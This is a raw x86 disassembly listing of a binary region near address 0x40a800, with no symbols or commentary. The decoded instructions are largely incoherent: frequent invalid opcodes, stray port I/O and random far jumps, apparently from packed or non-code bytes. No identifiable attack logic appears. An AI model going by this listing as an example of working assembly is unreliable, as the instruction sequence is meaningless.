  40a803:	sbb    BYTE PTR [ebp+0x75ef2855],cl
  40a809:	xchg   ebx,eax
  40a80a:	(bad)  
  40a80c:	add    eax,0xffffffa0
  40a80f:	stc    
  40a810:	cmp    BYTE PTR [ebp+0x28],0x7
  40a814:	je     0x40a845
  40a816:	dec    ebp
  40a817:	popa   
  40a818:	cld    
  40a819:	add    al,ah
  40a81b:	lahf   
  40a81c:	(bad)  
  40a81d:	jbe    0x40a7d1
  40a81f:	mov    esp,0x50f4fc73
  40a824:	in     eax,0x1
  40a826:	int3   
  40a827:	mov    dh,ch
  40a829:	test   DWORD PTR [eax],eax
  40a82b:	add    BYTE PTR [eax],al
  40a82d:	add    BYTE PTR [eax],al
  40a82f:	xor    bh,BYTE PTR [edx]
  40a831:	sbb    BYTE PTR [ebx+0x4d89e251],cl
  40a837:	xchg   esp,eax
  40a838:	adc    al,0x8b
  40a83a:	(bad)  
  40a83b:	hlt    
  40a83c:	dec    esi
  40a83d:	xchg   ebx,eax
  40a83e:	add    DWORD PTR [ebx+eax*4+0x159a75be],ebx
  40a845:	call   0x45dade
  40a84a:	xor    cl,BYTE PTR [ebx+ebx*1+0x5e]
  40a84e:	leave  
  40a84f:	sahf   
  40a850:	or     al,BYTE PTR [eax]
  40a852:	mov    edx,DWORD PTR [ecx]
  40a854:	mov    ebx,0x8e504387
  40a859:	xor    DWORD PTR [eax-0x741317b3],esi
  40a85f:	pop    esp
  40a860:	mov    esp,0xff5d90ae
  40a865:	dec    DWORD PTR [ebp+esi*2-0x32f7d963]
  40a86c:	mov    ecx,0x6f750057
  40a871:	push   es
  40a872:	pop    eax
  40a873:	sbb    eax,0x7500730a
  40a878:	ins    DWORD PTR es:[edi],dx
  40a879:	les    ecx,FWORD PTR [esi]
  40a87b:	add    BYTE PTR [ecx],ch
  40a87d:	ret    0x7503
  40a880:	push   ds
  40a881:	mov    ebp,ebx
  40a883:	(bad)  
  40a884:	and    eax,0xe5118110
  40a889:	add    eax,DWORD PTR [eax]
  40a88b:	jne    0x40a8a0
  40a88d:	sahf   
  40a88e:	push   DWORD PTR [ecx+ebp*8+0x2]
  40a892:	push   edi
  40a893:	add    BYTE PTR [eax],al
  40a895:	add    BYTE PTR [eax],al
  40a897:	add    BYTE PTR [ecx+ebx*8-0x6bb486b0],ch
  40a89e:	push   edi
  40a89f:	or     BYTE PTR [esi-0x3f],al
  40a8a2:	pop    eax
  40a8a3:	out    0x74,al
  40a8a5:	jmp    0xe9a6252b
  40a8aa:	push   esi
  40a8ab:	and    al,0xc2
  40a8ad:	std    
  40a8ae:	repz adc BYTE PTR [eax],0x75
  40a8b2:	fdiv   st(6),st
  40a8b4:	mov    dl,0xe8
  40a8b6:	pop    DWORD PTR [ecx+eiz*4-0x720121a6]
  40a8bd:	ficom  DWORD PTR [edi+0x0]
  40a8c0:	jne    0x40a922
  40a8c2:	mov    ch,0x8a
  40a8c4:	mov    esi,0x8bf38855
  40a8c9:	cmp    ebx,esi
  40a8cb:	out    0xd3,eax
  40a8cd:	mov    edx,0xeff40002
  40a8d2:	inc    edi
  40a8d3:	inc    ecx
  40a8d4:	retf   
  40a8d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d6:	push   edi
  40a8d7:	cmp    eax,0x443dd
  40a8dc:	jne    0x40a93c
  40a8de:	push   edx
  40a8df:	or     bl,al
  40a8e1:	lds    eax,FWORD PTR [eax]
  40a8e3:	(bad)  
  40a8e4:	rol    BYTE PTR [edx],1
  40a8e6:	icebp  
  40a8e7:	cmp    ebx,DWORD PTR [ebp+0x14]
  40a8ea:	cli    
  40a8eb:	add    DWORD PTR [ebp-0x73],esi
  40a8ee:	stos   DWORD PTR es:[edi],eax
  40a8ef:	or     edi,DWORD PTR [esi+0x45]
  40a8f2:	in     eax,0x58
  40a8f4:	push   esp
  40a8f5:	call   0x1c87:0x27503fe
  40a8fc:	add    BYTE PTR [eax],al
  40a8fe:	add    BYTE PTR [eax],al
  40a900:	add    BYTE PTR [ebx+0x51],bh
  40a903:	fimul  WORD PTR [esi]
  40a905:	loop   0x40a907
  40a907:	bound  edx,QWORD PTR [eax-0x7f]
  40a90a:	xor    dh,BYTE PTR [eax+0x3]
  40a90d:	clc    
  40a90e:	inc    ebp
  40a90f:	repz xor esp,DWORD PTR [esi+0x75e5e5ea]
  40a916:	add    bl,BYTE PTR [ecx-0x4fb21fd]
  40a91c:	ret    
  40a91d:	dec    ebx
  40a91e:	cmp    BYTE PTR [eax+0x1c026ec2],dh
  40a924:	mov    esi,ecx
  40a926:	cmp    DWORD PTR [esp+ecx*1+0x35e90274],0x22
  40a92e:	cdq    
  40a92f:	xchg   esi,eax
  40a930:	add    esi,DWORD PTR [ebp+0x2]
  40a933:	(bad)  
  40a934:	aam    0xef
  40a936:	rol    DWORD PTR [esi],0x19
  40a939:	int    0x50
  40a93b:	in     eax,dx
  40a93c:	adc    DWORD PTR [ebp-0x15f2fa13],esi
  40a942:	lds    ebx,FWORD PTR [eax]
  40a944:	frstor [ecx]
  40a946:	or     bl,BYTE PTR [esi+esi*1+0x7f]
  40a94a:	xor    al,0x51
  40a94c:	mov    dh,0x91
  40a94e:	add    ebp,ecx
  40a950:	imul   esi,DWORD PTR [ebp+0x2d],0xc4763551
  40a957:	mov    eax,0xe86885eb
  40a95c:	add    ebx,ebp
  40a95e:	(bad)  
  40a960:	add    esi,DWORD PTR [ebp-0x79]
  40a963:	jmp    FWORD PTR [esi+0x0]
  40a969:	add    BYTE PTR [esi+0x32],ch
  40a96c:	push   0xffffffeb
  40a96e:	fmul   DWORD PTR [ebx-0x1548be9]
  40a974:	push   edi
  40a975:	es jnp 0x40a9b6
  40a978:	inc    ecx
  40a979:	mov    edi,0xfba8eab3
  40a97e:	je     0x40a982
  40a980:	add    DWORD PTR [edx+edi*2+0x41c47402],0x4e
  40a988:	or     al,0x6a
  40a98a:	rcl    al,cl
  40a98c:	std    
  40a98d:	out    dx,al
  40a98e:	xor    ecx,ebx
  40a990:	mov    ebp,DWORD PTR [esi+ebp*1-0x29]
  40a994:	(bad)  
  40a995:	fimul  WORD PTR [esi]
  40a997:	mov    eax,ds:0x9c76e973
  40a99c:	(bad)  
  40a99d:	jmp    0xd6ce:0x6c8d0276
  40a9a4:	(bad)  
  40a9a5:	mov    esi,0xe973dece
  40a9aa:	jbe    0x40a93e
  40a9ac:	add    BYTE PTR [esi],cl
  40a9ae:	xchg   ebx,eax
  40a9af:	retf   
  40a9b0:	shl    ecx,0x76
  40a9b3:	das    
  40a9b4:	mov    ecx,DWORD PTR [ebp-0x15e41309]
  40a9ba:	jbe    0x40a9be
  40a9bc:	push   ebx
  40a9bd:	aaa    
  40a9be:	neg    cl
  40a9c0:	(bad)  
  40a9c1:	jmp    0x8cf2:0xf720276
  40a9c8:	pop    es
  40a9c9:	jmp    0x633f8186
  40a9ce:	add    BYTE PTR [eax],al
  40a9d0:	add    BYTE PTR [eax],al
  40a9d2:	add    BYTE PTR [esi+0x6d5d4c89],ah
  40a9d8:	ret    
  40a9d9:	jbe    0x40a99a
  40a9db:	cmc    
  40a9dc:	push   ebp
  40a9dd:	or     cl,ch
  40a9df:	in     eax,dx
  40a9e0:	dec    BYTE PTR [eax+0x26544ea4]
  40a9e6:	add    BYTE PTR [ebx-0x67cf7d0],dh
  40a9ec:	jmp    0x40a9ea
  40a9ee:	jmp    DWORD PTR [ebx-0x4b7a72fd]
  40a9f4:	mov    ch,0xfd
  40a9f6:	jmp    DWORD PTR [eax+ecx*2+0x74]
  40a9fa:	add    BYTE PTR [edx+ebp*2+0x4],cl
  40a9fe:	pop    edx
  40a9ff:	ror    DWORD PTR [eax-0x8],1
  40aa02:	lea    ebx,[ecx+0x73fffceb]
  40aa08:	jmp    0x40a98b
  40aa0a:	jne    0x40aa18
  40aa0c:	add    al,0x81
  40aa0e:	jge    0x40aa34
  40aa10:	inc    ecx
  40aa11:	inc    ecx
  40aa12:	push   esi
  40aa13:	fnstenv [eax]
  40aa15:	push   ds
  40aa16:	jmp    FWORD PTR [ecx+0x1c458d06]
  40aa1c:	orps   xmm1,XMMWORD PTR [ebp-0x51d7f]
  40aa23:	ret    
  40aa24:	ret    
  40aa25:	inc    ebx
  40aa26:	lock fdiv st(5),st
  40aa29:	(bad)  
  40aa2a:	inc    esp
  40aa2c:	arpl   si,di
  40aa2e:	jmp    DWORD PTR [ebx]
  40aa30:	cmp    DWORD PTR [esi+0x3b41b275],0x75
  40aa37:	add    BYTE PTR [eax],al
  40aa39:	add    BYTE PTR [eax],al
  40aa3b:	add    al,ch
  40aa3d:	xor    al,0xa2
  40aa3f:	xor    ecx,DWORD PTR [ebx*1+0x30ec95b]
  40aa46:	add    BYTE PTR [ebx+0x55f4e7da],cl
  40aa4c:	daa    
  40aa4d:	jmp    0xc43:0x8890ec81
  40aa54:	jp     0x40a9dd
  40aa56:	jno    0x40aa94
  40aa58:	pop    ss
  40aa59:	adc    bl,BYTE PTR [esi]
  40aa5b:	xor    al,0xcb
  40aa5d:	mov    BYTE PTR [ebx+0x8],bh
  40aa60:	addr16 mov bh,0x1
  40aa63:	(bad)  
  40aa64:	jne    0x40a9ff
  40aa66:	xor    DWORD PTR [ebx-0x2],edx
  40aa69:	and    ecx,DWORD PTR [ebp-0x24ce9ebc]
  40aa6f:	ss jne 0x40aa5b
  40aa72:	xchg   DWORD PTR [ebp+ebx*2+0x79],eax
  40aa76:	ins    BYTE PTR es:[edi],dx
  40aa77:	inc    eax
  40aa78:	push   edx
  40aa79:	mov    es,WORD PTR [esi]
  40aa7b:	inc    eax
  40aa7d:	rcr    ecx,1
  40aa7f:	adc    al,0x65
  40aa81:	fadd   QWORD PTR [edx+0x0]
  40aa84:	lock sub BYTE PTR [eax+0x3e],dl
  40aa88:	data16 and cl,BYTE PTR [esp+ecx*2+0xc47c22a]
  40aa90:	stos   DWORD PTR es:[edi],eax
  40aa91:	retf   0xb609
  40aa94:	rcl    al,0x8d
  40aa97:	inc    esp
  40aa98:	jge    0x40aafd
  40aa9a:	xor    BYTE PTR ds:0x7eff965,dl
  40aaa0:	add    BYTE PTR [eax],al
  40aaa2:	add    BYTE PTR [eax],al
  40aaa4:	add    BYTE PTR [ebx],al
  40aaa6:	push   ds
  40aaa7:	fstp   TBYTE PTR [edi+0x78]
  40aaaa:	mov    al,0xfe
  40aaac:	je     0x40ab27
  40aaae:	lahf   
  40aaaf:	aas    
  40aab0:	push   DWORD PTR [ebp+0x2a]
  40aab3:	pop    ds
  40aab4:	dec    ebp
  40aab5:	jno    0x40aad2
  40aab7:	mov    ebx,0x3291308c
  40aabc:	dec    DWORD PTR [eax-0x6f]
  40aabf:	fnstenv [ecx+edi*2-0x60]
  40aac3:	dec    edi
  40aac4:	or     dl,al
  40aac6:	int    0xf2
  40aac8:	adc    dh,BYTE PTR ds:0xa974d9e9
  40aace:	arpl   WORD PTR [esi-0x72b55aa],si
  40aad4:	xor    ebp,esi
  40aad6:	xchg   ebx,eax
  40aad7:	jmp    0x335f:0x2e96299
  40aade:	mov    ds:0x2750bc4,al
  40aae3:	mov    esp,0x4c828e8e
  40aae8:	and    esp,DWORD PTR [ebx]
  40aaea:	das    
  40aaeb:	bound  ebx,QWORD PTR [eax]
  40aaed:	and    edi,ebp
  40aaef:	test   al,0x3
  40aaf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf2:	int3   
  40aaf3:	rcr    dl,1
  40aaf5:	jbe    0x40aaf9
  40aaf7:	jmp    0x366e0569
  40aafc:	push   eax
  40aafd:	jge    0x40ab67
  40aaff:	call   0xfccf0cde
  40ab04:	inc    ebx
  40ab05:	jne    0x40aa92
  40ab07:	mov    ds:0xd7,eax
  40ab0c:	add    BYTE PTR [eax],al
  40ab0e:	neg    edx
  40ab10:	out    0x4f,eax
  40ab12:	push   esi
  40ab13:	mov    DWORD PTR [ebx+0x3034cbd7],esp
  40ab19:	lds    esi,FWORD PTR [esi+0x2]
  40ab1c:	push   0x58
  40ab1e:	adc    ecx,esi
  40ab20:	jl     0x40aaf6
  40ab22:	add    DWORD PTR [eax+0x9],eax
  40ab25:	xor    ecx,DWORD PTR [edx]
  40ab27:	lock cwde 
  40ab29:	lock inc edx
  40ab2b:	add    ch,BYTE PTR [edi+edi*1+0x15]
  40ab2f:	xor    edx,esi
  40ab31:	out    dx,eax
  40ab32:	sbb    ch,bh
  40ab34:	sub    BYTE PTR [edi+ebx*2],al
  40ab37:	add    ebx,DWORD PTR [edi]
  40ab39:	xor    cl,BYTE PTR [ebx-0x79]
  40ab3c:	and    esp,esp
  40ab3e:	sub    dl,ch
  40ab40:	popf   
  40ab41:	jg     0x40ab55
  40ab43:	push   eax
  40ab44:	xchg   esi,eax
  40ab45:	in     eax,dx
  40ab46:	add    eax,0x79201cd6
  40ab4b:	aad    0xf3
  40ab4d:	or     esp,DWORD PTR [esi+0x42]
  40ab50:	jmp    0xfa3f052d
  40ab55:	inc    ebx
  40ab56:	jne    0x40ab2d
  40ab58:	cld    
  40ab59:	pop    ds
  40ab5a:	jns    0x40abc4
  40ab5c:	jmp    0x4320cc
  40ab61:	fnstenv [esi-0x2b]
  40ab64:	adc    al,0xd5
  40ab66:	adc    DWORD PTR ds:0x51b96c00,0xee9db90b
  40ab70:	add    edi,edx
  40ab72:	add    BYTE PTR [eax],al
  40ab74:	add    BYTE PTR [eax],al
  40ab76:	add    BYTE PTR [esi+0x59e8b002],dh
  40ab7c:	add    esi,DWORD PTR [edx]
  40ab7e:	sub    DWORD PTR [ebx],edi
  40ab80:	add    DWORD PTR [eax],eax
  40ab82:	jns    0x40abfa
  40ab84:	rol    BYTE PTR [ebx],0xe9
  40ab87:	mov    ds:0x8198eb89,eax
  40ab8c:	xchg   DWORD PTR [ebp+eiz*1-0x77],eax
  40ab90:	xchg   DWORD PTR [eax-0xf],ebx
  40ab93:	dec    esi
  40ab94:	arpl   WORD PTR [ecx-0x15],bx
  40ab97:	jbe    0x40ab22
  40ab99:	dec    esp
  40ab9a:	(bad)  
  40ab9c:	add    DWORD PTR [ebx+0x6c],ebx
  40ab9f:	cmp    DWORD PTR [esi+0x4],ecx
  40aba2:	mov    ebx,0x6a19e836
  40aba7:	stos   BYTE PTR es:[edi],al
  40aba8:	(bad)  
  40aba9:	add    BYTE PTR [edi+0x78],dh
  40abac:	cmp    DWORD PTR [ecx+esi*8+0x68],0x311a0451
  40abb4:	call   0x14f9c5bb
  40abb9:	mov    ebx,DWORD PTR [ecx+eiz*8]
  40abbc:	jl     0x40abbe
  40abbe:	jns    0x40ac37
  40abc0:	retf   
  40abc1:	shr    ebp,0x76
  40abc4:	das    
  40abc5:	mov    eax,ebp
  40abc7:	stc    
  40abc8:	loopne 0x40abc1
  40abca:	push   0xffffffd2
  40abcc:	or     BYTE PTR [ebx+0x3f],dl
  40abcf:	lock rcl DWORD PTR [esi+0x6c],1
  40abd3:	jl     0x40abdf
  40abd5:	push   0xffffffe9
  40abd7:	add    eax,eax
  40abd9:	mov    BYTE PTR ds:0x0,dl
  40abdf:	add    BYTE PTR [ebp-0x6],dl
  40abe2:	out    0x0,eax
  40abe4:	pop    ds
  40abe5:	adc    eax,DWORD PTR [edx]
  40abe7:	add    BYTE PTR [eax],dl
  40abe9:	shl    DWORD PTR [edx+0x44],0xb
  40abed:	cs add al,0x8b
  40abf0:	xchg   esp,edi
  40abf2:	(bad)  
  40abf3:	xor    esp,DWORD PTR [edx+ebp*8]
  40abf6:	sub    DWORD PTR [eax],eax
  40abf8:	mov    WORD PTR [edi+edi*4+0x74],ss
  40abfc:	ins    DWORD PTR es:[edi],dx
  40abfd:	xchg   DWORD PTR [ecx+0xc],esi
  40ac00:	mov    ah,0xa5
  40ac02:	sub    al,BYTE PTR [eax]
  40ac04:	dec    esp
  40ac05:	ret    0x2442
  40ac08:	aas    
  40ac09:	add    DWORD PTR [eax+eax*8+0x44c4d511],eax
  40ac10:	jo     0x40abdf
  40ac12:	dec    BYTE PTR [edx+0x7882fc0f]
  40ac18:	and    al,0x0
  40ac1a:	mov    edi,ebx
  40ac1c:	sbb    esp,DWORD PTR [edi+edi*4+0x50]
  40ac20:	je     0x40abfd
  40ac22:	push   ebp
  40ac23:	add    cl,BYTE PTR [eax+eax*4]
  40ac26:	jp     0x40ac4c
  40ac28:	aas    
  40ac29:	add    BYTE PTR [ebp+0xd],dh
  40ac2c:	xchg   edi,eax
  40ac2d:	inc    ebx
  40ac2e:	and    al,0x14
  40ac30:	lahf   
  40ac31:	rcl    DWORD PTR [esi],0x56
  40ac34:	and    al,0x4a
  40ac36:	xchg   DWORD PTR [eax],eax
  40ac38:	or     al,0x89
  40ac3a:	inc    ebx
  40ac3b:	or     BYTE PTR [ebx+ebx*4+0xcdc0211],dh
  40ac42:	pop    esi
  40ac43:	mov    al,0x0
  40ac45:	add    BYTE PTR [eax],al
  40ac47:	add    BYTE PTR [eax],al
  40ac49:	int    0x18
  40ac4b:	mov    esp,ebp
  40ac4d:	jns    0x40ac0f
  40ac4f:	add    al,BYTE PTR [eax]
  40ac51:	fild   DWORD PTR [ebp-0x1993fbc1]
  40ac57:	sbb    BYTE PTR [ecx-0x32],0xff
  40ac5b:	mov    cl,BYTE PTR [eax+esi*4+0x7]
  40ac5f:	mov    DWORD PTR [ecx],eax
  40ac61:	jne    0x40acc3
  40ac63:	inc    eax
  40ac64:	and    al,0x79
  40ac66:	fwait
  40ac67:	add    eax,DWORD PTR [ecx]
  40ac69:	test   ax,0x11c
  40ac6d:	push   0x2e
  40ac6f:	vpsubsw xmm1,xmm7,XMMWORD PTR [ecx-0x1522aebd]
  40ac78:	jns    0x40ace0
  40ac7a:	out    0x2,eax
  40ac7c:	mov    al,0x74
  40ac7e:	daa    
  40ac7f:	add    BYTE PTR [eax],al
  40ac81:	xor    BYTE PTR [ebx+0x44],0x4
  40ac85:	test   BYTE PTR [eax+0x4],0x74
  40ac89:	jno    0x40ac1c
  40ac8b:	dec    esi
  40ac8c:	add    esp,DWORD PTR [esi+0x69b7c329]
  40ac92:	daa    
  40ac93:	mov    ah,0x77
  40ac95:	ss push ecx
  40ac97:	repz shl DWORD PTR ds:0xee54c1a1,0x4
  40ac9f:	and    ebx,0x2d
  40aca2:	push   0xffffffe8
  40aca4:	xchg   ebx,eax
  40aca5:	jno    0x40ac90
  40aca7:	add    dl,BYTE PTR [ebx-0x35]
  40acaa:	je     0x40ac35
  40acac:	clc    
  40acad:	add    BYTE PTR [eax],al
  40acaf:	add    BYTE PTR [eax],al
  40acb1:	add    BYTE PTR [edx+0xb],ch
  40acb4:	aas    
  40acb5:	add    al,0xf6
  40acb7:	add    BYTE PTR [ecx+ecx*4],al
  40acba:	mov    DWORD PTR [ebp+0x116873fa],edi
  40acc0:	push   ecx
  40acc1:	sub    dh,BYTE PTR [edx]
  40acc3:	sbb    eax,0xe9930c20
  40acc8:	add    al,BYTE PTR [eax]
  40acca:	mov    dl,0x1c
  40accc:	and    BYTE PTR [eiz*4-0x31fffbea],dl
  40acd3:	mov    eax,0xdd9943bd
  40acd8:	out    dx,al
  40acd9:	dec    edx
  40acdb:	call   0x2d9f09d
  40ace0:	std    
  40ace1:	arpl   di,cx
  40ace3:	add    ecx,ebp
  40ace5:	mov    esi,0x9f91e36
  40acea:	jne    0x40acee
  40acec:	jmp    0xf55ee37b
  40acf1:	ins    BYTE PTR es:[edi],dx
  40acf2:	mov    ch,0x61
  40acf4:	xchg   ebx,eax
  40acf5:	add    esi,DWORD PTR [ebp-0x77]
  40acf8:	sub    al,0x20
  40acfa:	jns    0x40ac83
  40acfc:	and    al,0x20
  40acfe:	imul   ebp,DWORD PTR gs:[ecx],0xe9018f63
  40ad05:	mov    WORD PTR [esi+0x3512f926],?
  40ad0b:	adc    ah,0x1f
  40ad0e:	popf   
  40ad0f:	fimul  DWORD PTR [edx-0x75]
  40ad12:	pop    edx
  40ad13:	sar    BYTE PTR ds:0x4f,cl
  40ad19:	add    BYTE PTR [eax],al
  40ad1b:	cdq    
  40ad1c:	idiv   BYTE PTR [edi]
  40ad1e:	adc    dh,BYTE PTR [edx+eax*1-0x17]
  40ad22:	mov    BYTE PTR [esi+0x4d33fd26],dh
  40ad28:	or     al,BYTE PTR [eax]
  40ad2a:	add    al,0x75
  40ad2c:	xchg   DWORD PTR [eax],ebp
  40ad2e:	dec    edi
  40ad2f:	js     0x40ad63
  40ad31:	add    ebp,esp
  40ad33:	adc    eax,0x9e82e904
  40ad38:	es aad 0x3
  40ad3b:	mov    ah,bh
  40ad3d:	xor    BYTE PTR [ebx+0x4c],bh
  40ad40:	add    ch,cl
  40ad42:	in     al,dx
  40ad43:	jno    0x40ad48
  40ad45:	jmp    0xe592a24d
  40ad4a:	add    eax,DWORD PTR [edx+0x75047287]
  40ad50:	add    bl,BYTE PTR [eax+ebx*2-0x67]
  40ad54:	pop    edx
  40ad55:	sti    
  40ad56:	mov    eax,0x21649d2
  40ad5b:	jne    0x40ad72
  40ad5d:	add    BYTE PTR [edi-0x3e398265],bh
  40ad63:	inc    ebx
  40ad64:	ss add ch,cl
  40ad67:	cmp    dl,BYTE PTR [ecx+0x45fc0173]
  40ad6d:	and    al,0x1d
  40ad6f:	mov    ss,WORD PTR [edx+0x28]
  40ad72:	ficom  WORD PTR [ecx]
  40ad74:	les    eax,FWORD PTR [ebx-0x40898f5e]
  40ad7a:	out    dx,al
  40ad7b:	add    BYTE PTR [edx+0x814f],dl
  40ad81:	add    BYTE PTR [eax],al
  40ad83:	add    cl,dl
  40ad85:	aaa    
  40ad86:	add    ch,cl
  40ad88:	push   eax
  40ad89:	jg     0x40ae06
  40ad8b:	or     eax,0xb795da0d
  40ad90:	je     0x40ad94
  40ad92:	test   BYTE PTR [edx],dh
  40ad94:	mov    edx,0x82a58afb
  40ad99:	(bad)  
  40ad9a:	call   0x431f1d
  40ad9f:	ins    BYTE PTR es:[edi],dx
  40ada0:	in     eax,dx
  40ada1:	and    al,0x88
  40ada3:	jmp    0x40ae1b
  40ada5:	add    al,bh
  40ada7:	gs xchg ebp,eax
  40ada9:	add    BYTE PTR [ecx],0xe9
  40adac:	jbe    0x40ad38
  40adae:	jb     0x40ad59
  40adb0:	jbe    0x40ad8c
  40adb2:	repnz mov edi,0xd4ff0274
  40adb8:	dec    edx
  40adb9:	in     eax,0x42
  40adbb:	jmp    0x656432b3
  40adc0:	ja     0x40adc4
  40adc2:	add    BYTE PTR [eax-0x4b],ah
  40adc5:	cmp    BYTE PTR es:[edi+0x292444fb],dl
  40adcc:	inc    ecx
  40adcd:	jg     0x40ae42
  40adcf:	add    eax,0xd43c989
  40add4:	and    DWORD PTR [edx-0x2586d68b],0x4eb00f6
  40adde:	add    BYTE PTR [edx-0x24],ch
  40ade1:	jp     0x40adb9
  40ade3:	(bad)  
  40ade4:	cwde   
  40ade5:	and    ch,BYTE PTR [eax]
  40ade7:	xor    BYTE PTR [eax],al
  40ade9:	add    BYTE PTR [eax],al
  40adeb:	add    BYTE PTR [eax],al
  40aded:	mov    al,BYTE PTR [esi+0x0]
  40adf0:	call   0x42ccca
  40adf5:	pop    es
  40adf6:	or     al,0xff
  40adf8:	adc    eax,0x3ed1a4
  40adfd:	pop    ss
  40adfe:	inc    esi
  40adff:	or     BYTE PTR [ebp-0x74f3bf1b],al
  40ae05:	in     al,dx
  40ae06:	sbb    ecx,edx
  40ae08:	add    DWORD PTR [esi],0x99265c05
  40ae0e:	add    ecx,DWORD PTR ds:[ecx+0x35fefccb]
  40ae15:	shr    BYTE PTR [edi+0xfd10041],1
  40ae1b:	and    al,0x20
  40ae1d:	aad    0xf
  40ae1f:	and    al,0x38
  40ae21:	inc    esi
  40ae22:	add    eax,0x4678448d
  40ae27:	push   eax
  40ae28:	lea    ecx,[eax]
  40ae2a:	lock das 
  40ae2c:	(bad)  
  40ae2d:	sbb    al,dh
  40ae2f:	daa    
  40ae30:	(bad)  
  40ae31:	fild   WORD PTR [ebx+0x0]
  40ae34:	(bad)  
  40ae35:	fsubr  st,st(7)
  40ae37:	sub    eax,DWORD PTR [eax]
  40ae39:	pop    ebx
  40ae3a:	(bad)  
  40ae3c:	xor    BYTE PTR [ebp+edi*1+0x60840040],ch
  40ae43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae44:	add    BYTE PTR [edx+edi*2],bl
  40ae47:	(bad)  
  40ae48:	(bad)  
  40ae49:	fsubr  st,st(7)
  40ae4b:	sbb    ebp,DWORD PTR [edi+edi*2+0x8b0043]
  40ae52:	add    BYTE PTR [eax],al
  40ae54:	add    BYTE PTR [eax],al
  40ae56:	dec    eax
  40ae57:	sbb    cl,BYTE PTR [esp+eax*4]
  40ae5a:	mov    bh,0x29
  40ae5c:	add    al,0x8b
  40ae5e:	jne    0x40ae7d
  40ae60:	sub    BYTE PTR [eax],dl
  40ae62:	out    dx,al
  40ae63:	cmp    eax,0xc8451828
  40ae68:	sbb    ah,bh
  40ae6a:	fstp   DWORD PTR [esp+eax*1]
  40ae6d:	jmp    DWORD PTR [eax-0x4b]
  40ae70:	cmc    
  40ae71:	aas    
  40ae72:	jne    0x40ae52
  40ae74:	add    al,0x1
  40ae76:	jne    0x40ae51
  40ae78:	add    DWORD PTR [ebx+ebp*8-0x7012d91],eax
  40ae7f:	sbb    eax,0x80455028
  40ae84:	clc    
  40ae85:	adc    eax,DWORD PTR [edi+0x335f0419]
  40ae8b:	and    al,0x7f
  40ae8d:	in     al,0x28
  40ae8f:	pushf  
  40ae90:	cmp    DWORD PTR [edi-0x12],edx
  40ae93:	dec    edx
  40ae94:	pop    esi
  40ae95:	add    al,ch
  40ae97:	out    0xfa,eax
  40ae99:	out    0xb,eax
  40ae9b:	xchg   esi,eax
  40ae9c:	add    al,0x0
  40ae9e:	arpl   WORD PTR [ebp+0x28740c26],bx
  40aea4:	or     ch,BYTE PTR [esi+eiz*8+0x7b740299]
  40aeab:	ja     0x40ae87
  40aead:	test   BYTE PTR [ebp-0x26],dl
  40aeb0:	add    bl,BYTE PTR [edi-0x12]
  40aeb3:	es xor al,dl
  40aeb6:	jno    0x40ae91
  40aeb8:	jge    0x40aeff
  40aeba:	add    BYTE PTR [eax],al
  40aebc:	add    BYTE PTR [eax],al
  40aebe:	add    BYTE PTR [ecx+0x7273c466],al
  40aec4:	mov    ecx,edx
  40aec6:	adc    al,0x71
  40aec8:	leave  
  40aec9:	inc    edx
  40aeca:	add    dh,ch
  40aecc:	push   ds
  40aecd:	fnstsw WORD PTR [ecx-0x7f]
  40aed0:	fild   DWORD PTR [edx]
  40aed2:	push   esi
  40aed3:	dec    al
  40aed5:	(bad)  
  40aed7:	outs   dx,BYTE PTR ds:[esi]
  40aed8:	fild   DWORD PTR [edx]
  40aeda:	test   BYTE PTR ds:0x4a0f5d02,dh
  40aee0:	jge    0x40af40
  40aee2:	add    dh,bh
  40aee4:	push   es
  40aee5:	ins    BYTE PTR es:[edi],dx
  40aee6:	ret    
  40aee7:	popw   es
  40aee9:	cmp    ebx,edx
  40aeeb:	cmp    esi,0x837543d8
  40aef1:	cmp    al,0x28
  40aef3:	jns    0x40aef7
  40aef5:	cmp    eax,0xe95c2a24
  40aefa:	pop    ebp
  40aefb:	jne    0x40af57
  40aefd:	std    
  40aefe:	add    al,0x75
  40af00:	add    bl,BYTE PTR [esi-0x6a11aea9]
  40af06:	sbb    DWORD PTR [edx+0x5af3e8f4],esp
  40af0c:	add    ch,BYTE PTR [ebx+eax*8+0x9]
  40af10:	or     al,cl
  40af12:	or     al,BYTE PTR [edi-0x3e]
  40af15:	add    DWORD PTR ds:0x320e00c5,0x38e905b7
  40af1f:	(bad)  
  40af20:	fidiv  WORD PTR [edi+0x34]
  40af26:	add    BYTE PTR [eax],al
  40af28:	inc    BYTE PTR [edx-0x1b]
  40af2b:	retf   0xceb9
  40af2e:	in     al,0x3
  40af30:	jne    0x40af34
  40af32:	ins    BYTE PTR es:[edi],dx
  40af33:	ret    
  40af34:	(bad)  
  40af35:	rol    DWORD PTR es:[ebx],cl
  40af38:	clc    
  40af39:	aas    
  40af3a:	xor    eax,0x313ff034
  40af3f:	xor    al,0xcf
  40af41:	sti    
  40af42:	mov    eax,0xf8fa89d2
  40af47:	inc    ebx
  40af48:	jne    0x40aed1
  40af4a:	sub    BYTE PTR [edi+0x70],dl
  40af4d:	or     DWORD PTR [ebx-0x11a88931],0x50cab97e
  40af57:	or     al,BYTE PTR [ecx+0x36ba0000]
  40af5d:	imul   eax,DWORD PTR [edx-0x3dfe90f5],0xffffffa8
  40af64:	rol    DWORD PTR [eax],0xc9
  40af67:	stos   BYTE PTR es:[edi],al
  40af68:	mov    ds:0x603aeb79,al
  40af6d:	mov    ch,0x8a
  40af6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af70:	mov    ecx,0xa4c6fe9c
  40af75:	or     al,bl
  40af77:	xor    eax,0xc2c0107d
  40af7c:	jg     0x40afb2
  40af7e:	push   ebx
  40af7f:	scas   al,BYTE PTR es:[edi]
  40af80:	and    bh,dl
  40af82:	out    0xd0,eax
  40af84:	xchg   esi,eax
  40af85:	add    al,BYTE PTR [eax]
  40af87:	jb     0x40af4a
  40af89:	xchg   ch,dh
  40af8b:	sbb    al,0x0
  40af8d:	add    BYTE PTR [eax],al
  40af8f:	add    BYTE PTR [eax],al
  40af91:	ins    DWORD PTR es:[edi],dx
  40af92:	adc    al,al
  40af94:	xor    BYTE PTR [esi],0x7f
  40af97:	inc    ebx
  40af98:	out    0xa5,eax
  40af9a:	js     0x40af69
  40af9c:	ret    0x50a6
  40af9f:	adc    al,0x63
  40afa1:	xchg   BYTE PTR [ebp-0x3071dac],al
  40afa7:	xchg   eax,edi
